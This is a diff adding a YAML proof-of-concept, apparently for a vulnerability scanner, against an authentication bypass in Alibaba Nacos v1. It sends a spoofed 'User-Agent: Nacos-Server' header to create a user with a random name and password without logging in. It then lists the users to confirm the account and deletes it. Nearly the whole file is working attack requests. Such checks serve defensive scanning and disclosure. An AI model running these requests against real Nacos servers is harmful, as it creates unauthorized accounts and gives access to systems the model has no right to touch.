@@ -1,0 +1,41 @@
+name: poc-yaml-alibaba-nacos-v1-auth-bypass
+manual: true
+transport: http
+set:
+    r1: randomLowercase(16)
+    r2: randomLowercase(16)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            # 增加了 bypass 的方式
+            path: /nacos/v1/auth/users/?username={{r1}}&password={{r2}}
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /nacos/v1/auth/users/?pageNo=1&pageSize=999
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.body.bcontains(bytes(r1))
+    r2:
+        request:
+            cache: true
+            method: DELETE
+            path: /nacos/v1/auth/users/?username={{r1}}
+            headers:
+                User-Agent: Nacos-Server
+        # 不需要判断这个条件
+        expression: "true"
+expression: r0() && r1() && r2()
+detail:
+    author: kmahyyg(https://github.com/kmahyyg)
+    links:
+        - https://github.com/alibaba/nacos/issues/4593
+        - https://github.com/alibaba/nacos/issues/4701
+    vulnerability:
+        id: CT-153900
